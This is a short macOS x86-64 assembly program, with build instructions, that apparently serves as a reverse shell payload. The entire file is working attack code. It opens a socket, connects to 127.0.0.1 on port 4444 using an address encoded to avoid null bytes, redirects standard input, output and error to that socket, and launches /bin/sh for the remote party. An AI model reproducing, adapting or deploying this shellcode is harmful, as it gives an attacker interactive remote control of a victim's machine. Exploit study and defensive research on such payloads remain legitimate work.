;	Executable name	:	reverse_shell
;	Version			:	1.0
;	Author			: 	p1tsi
;	Description		:	This program create a reverse shell
;
;	Build:
;		nasm -f macho64 reverse_shell.asm
;		ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -l System -o reverse_shell reverse_shell.o
;

bits 64

global _main

_main:

    ; create socket
    ; 97	AUE_SOCKET	ALL	{ int socket(int domain, int type, int protocol); }
    push    0x2
    pop     rdi         ; domain
    push    0x1
    pop     rsi         ; type
    xor     rdx, rdx    ; protocol

    push    0x61
    pop     rax
    bts     rax, 25
    syscall

    mov r9, rax         ; save socket id

    ; connect to remote ip:port
    ; 98	AUE_CONNECT	ALL	{ int connect(int s, caddr_t name, socklen_t namelen) NO_SYSCALL_STUB; }
    xor     rbx, rbx
    push    rbx                         ; name.sin_zero
    mov     rbx, 0x0101017f5c110201
    dec     rbx
    btr     rbx, 40
    btr     rbx, 48   
    push    rbx
    push    rsp
    pop     rsi                         ; name

    push    0x10
    pop     rdx                         ; namelen
    mov     rdi, r9                     ; s

    push    0x62
    pop     rax
    bts     rax, 25
    syscall

    ; dup2
    ; 90	AUE_DUP2	ALL	{ int sys_dup2(u_int from, u_int to); }
    mov     rdi, r9    ; from
    
    ; for loop
    push    0x2
    pop     rsi         ; to

dup2_syscall:
    push    0x5a
    pop     rax
    bts     rax, 25
    syscall

    dec     rsi
    jns     dup2_syscall


    ; execve("/bin/sh", NULL, NULL)
    mov     rbx, '/bin//sh'
    push    rbx       
    mov     rdi, rsp        ; fname
    xor     rsi, rsi        ; argp
    xor     rdx, rdx        ; envp   

    push    0x3b
    pop     rax
    bts     rax, 25
    syscall
